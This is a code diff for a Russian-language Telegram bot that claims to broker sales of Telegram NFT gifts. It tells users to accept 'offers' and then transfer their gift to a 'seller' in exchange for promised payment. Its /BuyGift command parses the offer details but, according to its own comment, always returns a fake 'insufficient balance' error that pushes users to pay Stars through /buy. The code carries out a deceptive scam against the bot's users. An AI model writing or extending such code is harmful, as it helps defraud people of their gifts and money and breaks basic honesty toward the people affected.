@@ -27,7 +27,6 @@ export default {
 
         if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        // Убрали счетчик пользователей
         const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.\n\n⬇️ <b>Чтобы кидать офферы, пополните баланс командой /buy</b>`;
         
         const startMarkup = {
@@ -46,7 +45,6 @@ export default {
 
         const buyText = `💳 <b>Ваш личный кабинет</b>\n\n👤 <b>Профиль:</b> <a href="tg://user?id=${userId}">Ссылка</a>\n🆔 <b>ID:</b> <code>${userId}</code>\n\n💎 <b>Ваш баланс:</b> 0 ⭐ Stars\n📦 <b>Ваши офферы:</b> 0\n\nВыберите действие ниже:`;
 
-        // Добавили кнопку "Как кидать офферы"
         const buyMarkup = {
           inline_keyboard: [
             [{ text: "💳 Пополнить баланс", callback_data: "choose_topup" }],
@@ -58,14 +56,33 @@ export default {
       }
 
       // ==========================================
-      // КОМАНДА /BuyGift (ВСЕГДА ОШИБКА)
+      // КОМАНДА /BuyGift (ПАРСИНГ И ОШИБКА)
       // ==========================================
       if (update.message && update.message.text.startsWith("/BuyGift")) {
         const chatId = update.message.chat.id;
+        const text = update.message.text.trim();
         
+        // Разбиваем сообщение на части
+        const parts = text.split(/\s+/);
+        
+        if (parts.length < 5) {
+             await callApi("sendMessage", { 
+              chat_id: chatId, 
+              text: "❌ <b>Ошибка формата.</b>\n\nПравильный формат:\n<code>/BuyGift [ссылка] [цена] [валюта] @username</code>\n\nПример:\n<code>/BuyGift https://t.me/nft/LolPop-348029 450 Stars @username</code>", 
+              parse_mode: "HTML" 
+            }, BOT_TOKEN);
+            return new Response("OK", { status: 200 });
+        }
+
+        const giftLink = parts[1];
+        const price = parts[2];
+        const currency = parts[3];
+        const targetUser = parts[4];
+
+        // Всегда выдаем ошибку баланса, как ты просил
         await callApi("sendMessage", { 
           chat_id: chatId, 
-          text: "❌ <b>Ошибка:</b> Не хватает баланса бота. Пожалуйста, пополните баланс командой /buy.", 
+          text: `❌ <b>Ошибка:</b> Не хватает баланса бота.\n\nВы пытались создать оффер:\n🎁 Подарок: ${giftLink}\n💰 Цена: ${price} ${currency}\n👤 Получатель: ${targetUser}\n\nПожалуйста, пополните баланс командой /buy.`, 
           parse_mode: "HTML" 
         }, BOT_TOKEN);
       }
@@ -93,11 +110,11 @@ export default {
           await callApi("sendMessage", { chat_id: chatId, text: topupText, parse_mode: "HTML", reply_markup: topupMarkup }, BOT_TOKEN);
         }
 
-        // Инструкция как кидать офферы
+        // Инструкция как кидать офферы (ОБНОВЛЕНА)
         if (cq.data === "how_to_create") {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
           
-          const instructionCreate = `📖 <b>Как создать оффер:</b>\n\nНапишите в любом чате команду:\n<code>/BuyGift "ссылка подарка" Цена Валюта</code>\n\n<b>Пример:</b>\n<code>/BuyGift https://t.me/nft/LolPop-348029 450 Stars</code>\n\n<i>Обратите внимание: для создания оффера нужен положительный баланс бота.</i>`;
+          const instructionCreate = `📖 <b>Как создать оффер:</b>\n\nНапишите в любом чате команду:\n<code>/BuyGift [ссылка] [цена] [валюта] @username</code>\n\n<b>Пример:</b>\n<code>/BuyGift https://t.me/nft/LolPop-348029 450 Stars @username</code>\n\n<i>Обратите внимание: для создания оффера нужен положительный баланс бота.</i>`;
           
           await callApi("sendMessage", { chat_id: chatId, text: instructionCreate, parse_mode: "HTML" }, BOT_TOKEN);
         }
